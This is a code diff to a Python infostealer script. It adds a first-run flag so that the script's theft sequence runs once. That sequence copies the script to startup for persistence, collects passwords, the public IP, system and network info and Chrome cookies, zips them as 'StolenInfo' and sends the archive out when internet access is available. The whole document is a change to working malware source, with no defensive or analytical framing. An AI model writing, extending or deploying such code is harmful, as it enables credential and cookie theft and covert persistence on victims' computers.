@@ -51,12 +51,15 @@ count_str = 0
 
 currentdir = os.getcwd()    #Get current working directory
 
+first = False
+
 try:
     ip_address = socket.gethostbyname(socket.gethostname()) #Get Ip address
 except:
     pass
 
 if not os.path.exists(LOG_DIR):
+	first = True
 	os.mkdir(LOG_DIR)
 	
 if not os.path.exists(ZIP_DIR):
@@ -468,20 +471,21 @@ def takeScreen():
 	img = ImageGrab.grab()
 	img.save(SCR_DIR + scr + '.png')
 
-copytostartup()
-getpasswords()	
-getpublicip()
-getsysinfo()
-getipconfig()
-#driveTree()
-try:
-	getChromeCookies()
-except:
-	pass
-zipFiles('Info')
-if internet_on() == True:   #If internet is On
-	sendData("StolenInfo", ".zip")
-removeFiles("StolenInfo.zip")
+if first:
+	copytostartup()
+	getpasswords()	
+	getpublicip()
+	getsysinfo()
+	getipconfig()
+	#driveTree()
+	try:
+		getChromeCookies()
+	except:
+		pass
+	zipFiles('Info')
+	if internet_on() == True:   #If internet is On
+		sendData("StolenInfo", ".zip")
+	removeFiles("StolenInfo.zip")
 
 	
 #print('finished')
